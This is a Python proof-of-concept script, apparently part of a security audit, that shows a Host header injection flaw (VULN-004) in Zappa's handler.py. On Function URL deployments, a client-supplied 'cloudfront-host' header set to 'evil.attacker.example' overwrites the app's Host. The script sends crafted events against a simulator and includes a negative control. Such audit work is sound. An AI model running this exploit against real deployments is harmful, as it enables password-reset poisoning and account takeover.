#!/usr/bin/env python3
"""VULN-004 — `cloudfront-host` header overwrites the app's Host (Function URL).

Vulnerable code : targets/Zappa/zappa/handler.py:813-815
Vulnerability   : CWE-644 Improper Neutralization of HTTP Headers / Host header injection.
Surface         : A (HTTP request path — internet-facing, unauthenticated) on Function-URL deployments.

Mechanism (plain English)
-------------------------
On the v1 request path Zappa contains a CloudFront→Function-URL convenience:

    host = raw_headers.get("Host")
    ...
    if host.find("lambda-url") > -1 and event.get("headers", {}).get("cloudfront-host"):
        event["headers"]["host"] = event["headers"]["cloudfront-host"]

If the request's Host looks like a Lambda Function URL (`*.lambda-url.*`) and the
event carries a client-supplied `cloudfront-host` header, Zappa **overwrites** the
Host the app will see with that client value — with no allow-list or validation.
The app then derives `request.host`, absolute URLs, and (critically) any
password-reset / email links from an attacker-chosen Host.

Exploitation idea
-----------------
Model a CloudFront→Function-URL request: Host = `<id>.lambda-url.<region>.on.aws`
plus `cloudfront-host: evil.attacker.example`. The app ends up believing its Host
is `evil.attacker.example`.

What a successful run proves
----------------------------
The client-supplied `cloudfront-host` replaces the Host the deployed app sees;
without it the app keeps the real Function-URL host — so the header is the source.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, log, raw_event, verdict

VULN = "VULN-004"

FURL_HOST = "abc123def456.lambda-url.us-east-1.on.aws"  # a Lambda Function URL host
EVIL = "evil.attacker.example"


def echo_event(headers):
    """Send a crafted v1 (REST/Function-URL 1.0) event to /echo and return the Host the app saw.

    The header casing here (`Host` + lowercase `cloudfront-host`) models how a
    CloudFront-fronted Function URL delivers the event to the handler; the
    HTTP simulator's werkzeug layer would otherwise re-case custom headers.
    """
    ev = {
        "httpMethod": "GET",
        "path": "/echo",
        "headers": dict(headers),
        "multiValueHeaders": {k: [v] for k, v in headers.items()},
        "requestContext": {"identity": {}},
    }
    r = raw_event(ev)
    body = json.loads(r["result"]["body"])
    return body["headers"].get("Host")


def main():
    banner(VULN, "cloudfront-host header overwrites the app Host (Function URL)",
           "zappa/handler.py:813-815 (host.find('lambda-url') + cloudfront-host swap)")

    # Attack: Function-URL Host + attacker-controlled cloudfront-host.
    log("STEP", f"sending Host={FURL_HOST!r} + cloudfront-host={EVIL!r} (models CloudFront->Function URL)")
    attacked = echo_event({"Host": FURL_HOST, "cloudfront-host": EVIL})
    log("INFO", f"app-seen Host header = {attacked!r}")

    # Negative control: same request without cloudfront-host — the real host must survive.
    log("STEP", "control: same request WITHOUT cloudfront-host (Host should stay the Function-URL host)")
    control = echo_event({"Host": FURL_HOST})
    log("INFO", f"app-seen Host header (control) = {control!r}")

    if attacked == EVIL and control != EVIL:
        log("PROOF", f"the client-supplied cloudfront-host ({EVIL}) replaced the Host the app sees; "
                     f"without it the app kept {control!r}. On a Function-URL deploy an attacker sets the "
                     f"app's Host at will → password-reset/absolute-URL poisoning (ATO) and cache poisoning.")
        log("OK", "exploit confirmed — Host overwritten by client cloudfront-host header")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — cloudfront-host overwrites app Host on Function-URL deploys")
        return 0
    log("FAIL", f"attacked={attacked!r} control={control!r}")
    verdict("FAILED", f"{VULN}: FAILED — Host was not overwritten")
    return 1


if __name__ == "__main__":
    sys.exit(main())
